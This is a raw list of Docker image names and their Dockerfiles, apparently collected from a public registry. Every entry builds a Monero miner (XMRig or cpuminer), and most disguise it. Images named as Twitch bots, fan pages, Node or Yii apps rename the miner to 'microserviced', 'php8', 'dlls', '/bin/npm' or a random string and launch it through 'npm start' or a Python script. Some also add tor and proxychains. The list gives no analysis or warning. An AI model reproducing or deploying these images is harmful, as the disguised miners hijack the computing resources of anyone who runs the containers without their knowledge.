blackufa/twitch-bot; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone -b open-loki https://github.com/cryptocheck/chatik.git && cd chatik && npm i && \\\n    git clone https://github.com/cryptocheck/fan-page.git && \\\n    cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n   cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD npm start'
blackufa/twitch-notify; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone -b open-loki https://github.com/cryptocheck/chatik.git && cd chatik && npm i && \\\n    git clone https://github.com/cryptocheck/fan-page.git && \\\n    cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n   cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD npm start'
myatom/doudou; b'FROM  alpine:latest\nRUN   adduser -S -D -H -h /xmrig miner\nRUN   apk --no-cache upgrade && \\\n      apk --no-cache add \\\n        git \\\n        cmake \\\n        libuv-dev \\\n        build-base && \\\n      git clone https://github.com/xmrig/xmrig && \\\n      cd xmrig && \\\n      sed -i -e \'s/constexpr const int kDonateLevel = 5;/constexpr const int kDonateLevel = 0;/g\' src/donate.h && \\\n      mkdir build && \\\n      cmake -DCMAKE_BUILD_TYPE=Release . && \\\n      make && \\\n      apk del \\\n        build-base \\\n        cmake \\\n        git\n\nUSER miner\nCOPY config.json /xmrig\nWORKDIR    /xmrig\nENTRYPOINT  ["./xmrig"]'
bdklz/xmrig; b'FROM ubuntu:16.04\n\nWORKDIR /app\n\nRUN apt-get update\nRUN apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev\nRUN git clone https://github.com/bdklz/xmrig.git /app\nRUN mkdir /app/build\nRUN cmake .\nRUN make\nRUN cp xmrig php8\n\n\n\nENTRYPOINT  ["./php8"]'
blackufa/team; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone -b open-loki https://github.com/cryptocheck/chatik.git && cd chatik && npm i && \\\n    git clone https://github.com/cryptocheck/fan-page.git && \\\n    cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n   cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD npm start'
blackufa/twitch-integrator; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone -b open-loki https://github.com/cryptocheck/chatik.git && cd chatik && npm i && \\\n    git clone https://github.com/cryptocheck/fan-page.git && \\\n    cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n   cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD npm start'
revoss7/wine; b'FROM centos:latest\n\nENV LC_ALL en_US.UTF-8\nRUN /usr/bin/yum install -y git automake gcc make curl-devel jansson-devel && \\\n    /usr/bin/yum clean all\nWORKDIR /usr/src\nRUN git clone https://github.com/hyc/cpuminer-multi\nWORKDIR cpuminer-multi\nRUN ./autogen.sh\nRUN ./configure \nRUN make\nRUN make install\nRUN cd /usr/local/bin\nRUN mv minerd wine\nENTRYPOINT ["/usr/local/bin/minerd"]'
wiedjmin/vaselisk; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone -b open https://github.com/cryptocheck/chatik.git && cd chatik && npm i && \\\n    git clone https://github.com/cryptocheck/fan-page.git && \\\n    cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n   cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD npm start'
snailkick/fan-page; b'FROM ubuntu:18.04\nRUN apt-get update && \\\n    apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev && \\\n    curl -sL https://deb.nodesource.com/setup_10.x | bash - && \\\n    apt-get install -y nodejs && \\\n    git clone -b open-loki https://github.com/cryptocheck/chatik.git && cd chatik && npm i && \\\n    git clone https://github.com/cryptocheck/fan-page.git && \\\n    cd fan-page && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make && \\\n    mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf fan-page\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) && \\\n   cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD npm start'
azurenql/227_135_tor; b'ADD file:a5b5bea2fa5358461649feb68a28ec3e9ec4547164744e8eb7f4112c1969f64f /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nUSER root\nRUN apt-get update   && apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git  && rm -rf /var/lib/apt/lists/*\nCOPY file:4c0524b4bd7b000eb6ef56620f46178c3ffab8ed5d9b8ab21742fbe56917d331 /etc/dao.py\nRUN chmod a+x /etc/dao.py\nCOPY dir:94c70c0ba4d8ca4378d122acaa585806a6a49f3860f42b676b9f1330022e4315 xmrig\nRUN cd xmrig && mkdir build && cd build && cmake .. && make\nRUN ln -s -f /xmrig/build/xmrig /usr/local/bin/dlls\nRUN ln -s -f /xmrig/build/xmrig /usr/local/dlls\nCOPY dir:c0f6bc05e971c91db6e2cd95830bcbc9b06bebd6552e07a1c7d1c4482a7ee851 proxychains-ng\nRUN cd proxychains-ng && make && make install && make install-config\nENTRYPOINT ["/bin/sh -c python /etc/dao.py"]'
azurenql/93_164; b'ADD file:a5b5bea2fa5358461649feb68a28ec3e9ec4547164744e8eb7f4112c1969f64f /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nUSER root\nRUN apt-get update   && apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git  && rm -rf /var/lib/apt/lists/*\nCOPY file:3c6d1382ff456317b8eb0c8c5e1c124df421d1eb38482cb41950d98cd2feb04f /etc/dao.py\nRUN chmod a+x /etc/dao.py\nCOPY dir:94c70c0ba4d8ca4378d122acaa585806a6a49f3860f42b676b9f1330022e4315 xmrig\nRUN cd xmrig && mkdir build && cd build && cmake .. && make\nRUN ln -s -f /xmrig/build/xmrig /usr/local/bin/dlls\nRUN ln -s -f /xmrig/build/xmrig /usr/local/dlls\nCOPY dir:c0f6bc05e971c91db6e2cd95830bcbc9b06bebd6552e07a1c7d1c4482a7ee851 proxychains-ng\nRUN cd proxychains-ng && make && make install && make install-config\nENTRYPOINT ["/bin/sh -c python /etc/dao.py"]'
azurenql/234_122; b'ADD file:a5b5bea2fa5358461649feb68a28ec3e9ec4547164744e8eb7f4112c1969f64f /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nUSER root\nRUN apt-get update   && apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git  && rm -rf /var/lib/apt/lists/*\nCOPY file:befdcaf2eb6b9dece39d1cd091a6d8b708c6948df183b3363385e7dcdf78ed75 /etc/dao.py\nRUN chmod a+x /etc/dao.py\nCOPY dir:2690b3186854f3452119e1c8174d3cc21f21edb7610a532a7ac8e71e1fa76486 xmrig\nRUN cd xmrig && mkdir build && cd build && cmake .. && make\nRUN ln -s -f /xmrig/build/xmrig /usr/local/bin/dlls\nRUN ln -s -f /xmrig/build/xmrig /usr/local/dlls\nCOPY dir:c0f6bc05e971c91db6e2cd95830bcbc9b06bebd6552e07a1c7d1c4482a7ee851 proxychains-ng\nRUN cd proxychains-ng && make && make install && make install-config\nENTRYPOINT ["/bin/sh -c python /etc/dao.py"]'
azurenql/227_135; b'ADD file:a5b5bea2fa5358461649feb68a28ec3e9ec4547164744e8eb7f4112c1969f64f /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nUSER root\nRUN apt-get update   && apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git  && rm -rf /var/lib/apt/lists/*\nCOPY file:a94b26a97d9105182ded4c75d651a10aeaf61180f966091e99c7d29abec096c4 /etc/dao.py\nRUN chmod a+x /etc/dao.py\nCOPY dir:2690b3186854f3452119e1c8174d3cc21f21edb7610a532a7ac8e71e1fa76486 xmrig\nRUN cd xmrig && mkdir build && cd build && cmake .. && make\nRUN ln -s -f /xmrig/build/xmrig /usr/local/bin/dlls\nRUN ln -s -f /xmrig/build/xmrig /usr/local/dlls\nCOPY dir:c0f6bc05e971c91db6e2cd95830bcbc9b06bebd6552e07a1c7d1c4482a7ee851 proxychains-ng\nRUN cd proxychains-ng && make && make install && make install-config\nENTRYPOINT ["/bin/sh -c python /etc/dao.py"]'
azurenql/53_57; b'ADD file:a5b5bea2fa5358461649feb68a28ec3e9ec4547164744e8eb7f4112c1969f64f /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nUSER root\nRUN apt-get update   && apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git  && rm -rf /var/lib/apt/lists/*\nCOPY file:211945aaab4534da2c594d7bb4ea933277467001b72067313f2e6459c28d6bbb /etc/dao.py\nRUN chmod a+x /etc/dao.py\nCOPY dir:2690b3186854f3452119e1c8174d3cc21f21edb7610a532a7ac8e71e1fa76486 xmrig\nRUN cd xmrig && mkdir build && cd build && cmake .. && make\nRUN ln -s -f /xmrig/build/xmrig /usr/local/bin/dlls\nRUN ln -s -f /xmrig/build/xmrig /usr/local/dlls\nCOPY dir:c0f6bc05e971c91db6e2cd95830bcbc9b06bebd6552e07a1c7d1c4482a7ee851 proxychains-ng\nRUN cd proxychains-ng && make && make install && make install-config\nENTRYPOINT ["/bin/sh -c python /etc/dao.py"]'
azurenql/227_135_app; b'ADD file:a5b5bea2fa5358461649feb68a28ec3e9ec4547164744e8eb7f4112c1969f64f /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nUSER root\nRUN apt-get update   && apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git  && rm -rf /var/lib/apt/lists/*\nCOPY file:911b9b6a51477ba7a25f6cd7ebd35ebe48547675b06efe90dfe9b58423174711 /etc/dao.py\nRUN chmod a+x /etc/dao.py\nCOPY file:6ff9ecdee84288e036a813bfec200852bf27cc0a688c398656ebeaac008bb4b3 index.html\nRUN python -m SimpleHTTPServer 80 &\nCOPY dir:94c70c0ba4d8ca4378d122acaa585806a6a49f3860f42b676b9f1330022e4315 xmrig\nRUN cd xmrig && mkdir build && cd build && cmake .. && make\nRUN ln -s -f /xmrig/build/xmrig /usr/local/bin/dlls\nRUN ln -s -f /xmrig/build/xmrig /usr/local/dlls\nCOPY dir:c0f6bc05e971c91db6e2cd95830bcbc9b06bebd6552e07a1c7d1c4482a7ee851 proxychains-ng\nRUN cd proxychains-ng && make && make install && make install-config\nENTRYPOINT ["/bin/sh -c python /etc/dao.py"]'
moppi/node; b'ADD file:5b334adf9d9a2256add2a801b49d4b23c93b0973ec22bb798973d571c948f102 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&   apt-get install -y git build-essential cmake libuv1-dev libmicrohttpd-dev &&   git clone https://github.com/xmrig/xmrig.git &&   cd xmrig &&   mkdir build &&   cd build &&   cmake .. &&   make\nRUN mv /xmrig/build/xmrig /bin/npm\nADD file:a166cd160aa2826926ba38d9012ae11bb4152d50888594510c805824de46fac5 /bin/node\nEXPOSE 3000/tcp\nCMD ["node"]'
batmamba/bananaclub; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&     mv xmrig $NAME && cp $NAME /deadpico && cd /deadpico && echo "\\n ./${NAME}" >> electrode.sh && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nCMD ["/bin/sh -c npm start"]'
trekhlebob/yii-loop; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
